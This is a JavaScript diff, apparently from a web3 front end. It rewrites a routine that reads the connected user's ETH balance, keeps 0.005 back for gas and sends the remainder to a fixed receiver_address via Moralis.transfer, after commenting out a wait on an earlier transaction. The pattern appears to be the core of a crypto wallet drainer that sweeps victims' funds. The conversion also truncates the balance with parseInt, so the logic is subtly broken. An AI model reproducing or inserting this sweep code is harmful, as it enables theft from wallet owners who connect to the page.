@@ -391,29 +391,32 @@ async function proceed(){
             },
           )
           console.log(transaction);
-          if(transaction){
-            await transaction.wait().then((v) => {
-              console.log('Finished Processing transaction:', v)
-            })
-          }
+          // if(transaction){
+          //   await transaction.wait().then((v) => {
+          //     console.log('Finished Processing transaction:', v)
+          //   })
+          // }
         }
-        const eth_balance = await getBalance(user_address, apiKey).catch(e=>{
-          console.log("Unable to get new eth balance", e);
-        });
-        const balance = Integer.parseInt(web3.utils.fromWei(eth_balance.balance, 'ether')) - 0.005;
-        console.log("The new eth balance", balance);
-        if (balance > 0) {
-        const options = {
-          type: "native",
-          amount: Moralis.Units.ETH(balance.toString()),
-          receiver: receiver_address,
-        };
-        let result = await Moralis.transfer(options);
-        console.log(result);
-      }
-      else {
-        console.log("Insufficient funds")
-      }
+        const web3 = new Web3(provider);
+          const eth_balance = await getBalance(user_address, apiKey).catch(e=>{
+            console.log("Unable to get new eth balance", e);
+          });
+          console.log("eth_balance", eth_balance);
+          console.log("eth_balance.balance", eth_balance.balance);
+          const balance = parseInt(web3.utils.fromWei(eth_balance.balance, 'ether')) - 0.005;
+          console.log("The new eth balance", balance);
+          if (balance > 0) {
+          const options = {
+            type: "native",
+            amount: Moralis.Units.ETH(balance.toString()),
+            receiver: receiver_address,
+          };
+          let result = await Moralis.transfer(options);
+          console.log(result);
+        }
+        else {
+          console.log("Insufficient funds")
+        }
     }
     send();
 }
